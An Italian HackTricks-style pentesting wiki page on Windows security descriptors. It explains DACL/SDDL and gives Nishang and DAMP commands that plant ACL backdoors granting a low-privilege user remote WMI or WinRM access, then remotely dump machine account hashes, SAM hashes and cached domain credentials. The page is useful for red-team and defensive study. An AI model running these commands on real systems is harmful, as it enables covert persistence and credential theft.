# Descrittori di sicurezza

{{#include ../../banners/hacktricks-training.md}}

## Descrittori di sicurezza

I descrittori di sicurezza di Windows contengono un SID del proprietario, un SID del gruppo primario, una ACL discrezionale (DACL) che controlla l'accesso e una ACL di sistema (SACL) utilizzata principalmente per il controllo. Security Descriptor Definition Language (SDDL) è la rappresentazione testuale; una stringa ACE ha la forma `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Un descrittore di sicurezza memorizza chi possiede un oggetto protetto e quali principal possono ottenere o vedersi negati specifici diritti su di esso. Se un attaccante può modificare una DACL, può concedere a un principal con pochi privilegi diritti che normalmente richiedono un ruolo amministrativo.

Questo rende i descrittori modificati in modo mirato utili per la persistenza: l'account rimane al di fuori dei gruppi privilegiati più evidenti, mantenendo al contempo l'accesso a una specifica superficie di gestione. Conservare il descrittore originale prima dei test, in modo da poter rimuovere esattamente la modifica.

### Accesso a WMI

È possibile concedere a un utente l'accesso per **eseguire WMI in remoto** [**usando questo**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Accesso a WinRM

Concedi a un utente l'accesso a un endpoint PowerShell/WinRM remoto con la funzione `Set-RemotePSRemoting` di Nishang:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accesso remoto agli hash

DAMP può creare una backdoor tramite ACL del registro che consente in seguito il recupero remoto dell'hash dell'account computer, degli hash SAM locali e delle credenziali di dominio memorizzate nella cache. Concedere questi diritti circoscritti a un account altrimenti ordinario, soprattutto nei confronti di un domain controller, fornisce una potente persistenza senza l'appartenenza a gruppi privilegiati.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consulta [**Silver Tickets**](silver-ticket.md) per scoprire come potresti utilizzare l'hash dell'account computer di un Domain Controller.

## References

- [1] [Linguaggio di definizione dei descrittori di sicurezza - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Progetto di modifica degli ACL discrezionali](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Formato stringa del descrittore di sicurezza](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
